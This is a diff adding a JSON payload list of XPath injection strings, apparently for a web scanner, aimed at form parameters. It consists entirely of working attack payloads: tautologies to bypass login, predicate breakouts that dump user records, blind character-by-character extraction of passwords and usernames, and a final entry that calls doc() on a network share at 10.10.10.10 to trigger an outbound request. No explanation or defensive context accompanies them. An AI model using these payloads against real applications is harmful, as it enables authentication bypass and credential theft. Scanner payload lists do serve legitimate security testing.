@@ -1,0 +1,123 @@
+[
+  {
+    "payload_id": "OWP-37591",
+    "vulnerability_category": "Injection (XPATH)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "string(//user[name/text()='\" +vuln_var1+ \"' and password/text()='\" +vuln_var1+ \"']/account/text())",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37592",
+    "vulnerability_category": "Injection (XPATH)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "' and count(/*)=1 and '1'='1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37593",
+    "vulnerability_category": "Injection (XPATH)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "' and count(/@*)=1 and '1'='1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37594",
+    "vulnerability_category": "Injection (XPATH)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "' and count(/comment())=1 and '1'='1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37595",
+    "vulnerability_category": "Injection (XPATH)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "')] | //user/*[contains(*,'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37596",
+    "vulnerability_category": "Injection (XPATH)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "') and contains(../password,'c",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37597",
+    "vulnerability_category": "Injection (XPATH)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "') and starts-with(../password,'c",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37598",
+    "vulnerability_category": "Injection (XPATH)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "and string-length(account)=SIZE_INT",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37599",
+    "vulnerability_category": "Injection (XPATH)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "substring(//user[userid=5]/username,2,1)=CHAR_HERE",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37600",
+    "vulnerability_category": "Injection (XPATH)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37601",
+    "vulnerability_category": "Injection (XPATH)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
